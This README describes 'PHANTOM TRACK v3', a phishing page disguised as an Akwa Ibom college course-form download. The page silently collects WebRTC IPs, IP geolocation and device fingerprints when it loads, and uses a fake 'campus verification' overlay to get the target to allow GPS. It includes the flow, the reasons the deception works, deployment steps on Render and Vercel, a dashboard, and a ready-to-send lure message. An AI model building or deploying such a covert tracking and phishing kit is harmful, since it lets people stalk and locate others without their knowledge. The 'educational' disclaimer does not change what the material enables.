# PHANTOM TRACK v3

**Educational cybersecurity project — authorized training only.**

A GPS tracking tool disguised as a course registration form **download page**.
The target clicks to download a PDF — GPS coordinates, IP geolocation, device
fingerprints, and WebRTC local IP are captured silently in the background.

---

## SCENARIO

A stolen phone. The thief is using it. The victim has the IP (`105.112.250.54`)
and can message the thief.

The thief is told: *"I need you to download this course form for me. Here's the link."*

The link opens a pre-filled Akwa Ibom COE course registration page.
9 courses. 23 credits. Ready to download.

The only action: **click "Download Form (PDF)"**.

---

## FLOW

```
THIEF CLICKS LINK
      │
      ▼
┌─────────────────────────────────┐
│  Pre-filled course form page    │  ← Passive fingerprints sent
│  9 courses listed               │    (WebRTC IP, audio, canvas,
│  Student: Okon Emmanuel Bassey  │     battery, network, device)
│  [ Download Form (PDF) ]        │
└─────────────────────────────────┘
      │ User clicks Download
      ▼
┌─────────────────────────────────┐
│  "Campus Verification Required" │  ← Social engineering overlay
│  "Verify location to download"  │    (primes user for Allow)
│  [ Verify & Download ]          │
└─────────────────────────────────┘
      │ User clicks Verify
      ▼
┌─────────────────────────────────┐
│  Browser GPS dialog             │  ← Native browser prompt
│  "Allow | Block"                │    (user already primed)
└─────────────────────────────────┘
      │ GPS captured OR IP fallback
      ▼
┌─────────────────────────────────┐
│  PDF auto-downloads             │  ← Real PDF generated (jsPDF)
│  "AKSCOE-Course-Form.pdf"       │    Looks official. 9 courses.
│  Page stays open                │    Thief thinks it worked.
└─────────────────────────────────┘
      │
      ▼
  All data at your Render dashboard
  GPS coords + Google Maps link +
  Device fingerprint + IP + WebRTC IPs
```

---

## WHAT IT CAPTURES

### Without any permission (passive — fires on page load)
| Data | Method |
|---|---|
| WebRTC local IPs (bypasses VPN) | RTCPeerConnection ICE |
| IP geolocation (city, region, ISP) | ipapi.co |
| Audio fingerprint | OfflineAudioContext |
| Canvas fingerprint | Canvas 2D hash |
| Battery level + charging | Battery API |
| Network type (4G/3G/WiFi) + speed | Network Info API |
| Device platform, screen, CPU, RAM | Navigator + Screen API |
| Timezone, languages, touch support | Intl + Navigator API |
| User agent | Navigator API |

### With one tap (user clicks "Verify & Download")
| Data | Method |
|---|---|
| **GPS coordinates (lat, lng, accuracy)** | Geolocation API (high accuracy, 12s timeout) |
| Altitude, heading, speed | Geolocation API |
| Google Maps direct link | Generated from coords |

---

## WHY THIS WORKS

1. **No form to fill** — The form is already filled. Okon Emmanuel Bassey. Matric 2023/NCE/EDU/0147. 9 courses. The thief just downloads.
2. **No suspicious requests** — No passport photo. No camera. No mic. Just "verify campus location to download."
3. **One action** — Click one button. That's it.
4. **Real PDF downloads** — The thief gets an actual PDF with the course form. Confirmation that "it worked."
5. **GPS is justified** — "Campus verification for document downloads" sounds like a real college policy.
6. **No red flags** — Everything on the page looks like a real Nigerian College of Education portal.

---

## DEPLOYMENT

### 1. Backend (Render)
1. [render.com](https://render.com) → New → Web Service
2. Root Directory: `backend`
3. Build: `npm install` | Start: `npm start`
4. Note URL: `https://phantom-track.onrender.com`

### 2. Frontend (Vercel)
1. [vercel.com](https://vercel.com) → Import `frontend/`
2. Root Directory: `frontend`
3. Deploy. Note URL: `https://akwaibom-portal.vercel.app`

### 3. Link
Edit `frontend/js/tracker.js` line 7:
```js
var BACKEND_URL = 'https://YOUR_RENDER_APP.onrender.com/api/log';
```
Redeploy frontend.

---

## THE LURE

Send from the friend's phone (WhatsApp/SMS):

> *"Abeg help me download this course form. I dey outside campus and the portal dey verify location before e go allow download. Here's the link: https://your-app.vercel.app/course-form.pdf"*

---

## DASHBOARD

`https://YOUR_RENDER_APP.onrender.com`

- GPS coordinates with Google Maps links
- IP geolocation fallback
- Device fingerprints (WebRTC IPs, battery, network)
- Session tracking (first visit vs return)
- Auto-refresh every 15s

---

## DISCLAIMER

Educational use only. Unauthorized tracking violates Nigeria's Cybercrime Act 2015.
Use only on devices you own or have written authorization to test.
